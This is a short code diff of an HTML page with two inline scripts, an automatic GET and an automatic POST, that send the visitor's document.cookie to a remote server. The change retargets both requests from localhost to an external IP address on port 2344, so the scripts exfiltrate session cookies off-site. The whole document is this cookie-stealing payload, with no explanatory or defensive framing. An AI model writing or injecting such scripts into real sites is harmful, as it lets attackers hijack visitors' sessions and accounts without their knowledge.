@@ -4,7 +4,7 @@
 <!-- Automatic Get Script -->
 <script type="text/javascript">
 	var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("GET", "http://localhost:2344/?" + document.cookie, true); // true for asynchronous 
+    xmlHttp.open("GET", "http://147.222.204.171:2344/?" + document.cookie, true); // true for asynchronous 
     xmlHttp.onreadystatechange = function() { 
         if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
             console.log(xmlHttp.responseText);
@@ -18,7 +18,7 @@
 <!-- Automatic POST Script -->
 <script type="text/javascript">
 	var xmlHttp = new XMLHttpRequest();
-	xmlHttp.open("POST", "http://localhost:2344/?" + document.cookie, true);
+	xmlHttp.open("POST", "http://147.222.204.171:2344/?" + document.cookie, true);
 	xmlHttp.onreadystatechange = function() {
 	    if(xmlHttp.readyState == 4 && xmlHttp.status == 200) {
 	        console.log(xmlHttp.responseText);
